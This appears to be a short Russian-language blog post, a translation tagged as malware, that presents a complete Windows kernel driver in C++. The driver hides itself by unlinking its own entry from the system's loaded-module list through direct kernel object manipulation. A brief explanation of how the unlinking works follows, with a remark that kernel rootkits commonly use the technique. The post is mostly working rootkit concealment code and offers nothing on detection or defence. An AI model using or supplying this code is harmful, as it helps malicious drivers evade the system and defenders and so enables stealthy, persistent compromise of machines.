---
layout: post
title: Сокрытие загруженного драйвера с помощью DKOM
category: [translations]
tag: [windows, malware]
---

```cpp
#include <ntddk.h>
 
typedef struct _LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     USHORT LoadCount;
     USHORT TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     struct _ACTIVATION_CONTEXT * EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath)
{
    PLDR_DATA_TABLE_ENTRY PrevEntry,ModuleEntry,NextEntry;
 
    DbgPrint("DriverSection address: %#x",pDriverObject->DriverSection);
    ModuleEntry=(PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
 
    PrevEntry=(PLDR_DATA_TABLE_ENTRY)ModuleEntry->InLoadOrderLinks.Blink;
    NextEntry=(PLDR_DATA_TABLE_ENTRY)ModuleEntry->InLoadOrderLinks.Flink;
 
    PrevEntry->InLoadOrderLinks.Flink=ModuleEntry->InLoadOrderLinks.Flink;
    NextEntry->InLoadOrderLinks.Blink=ModuleEntry->InLoadOrderLinks.Blink;
 
    ModuleEntry->InLoadOrderLinks.Flink=(PLIST_ENTRY)ModuleEntry;
    ModuleEntry->InLoadOrderLinks.Blink=(PLIST_ENTRY)ModuleEntry;
 
    DbgPrint("Hidden driver loaded at address %#x",ModuleEntry->DllBase);
    return STATUS_SUCCESS;
}
```

Данный код удаляет наш драйвер из связанного списка загруженных системой драйверов. При загрузке драйвера, адрес его объекта передается в DriverEntry. Поле DriverSection в структуре DRIVER_OBJECT указывает на структуру LDR_DATA_TABLE_ENTRY, которая содержит информацию о загруженном драйвере, такую как базовый адрес, адрес точки входа и т.д. Система начинает определять загруженные драйверы проходясь по списку PsLoadedModuleList, который содержит ссылки на другие структуры, описывающие драйвера. При удалении из списка структуры нашего драйвера, драйвер не будет определен системой.

Вышеприведенная техника обычно используется ядерными руткитами.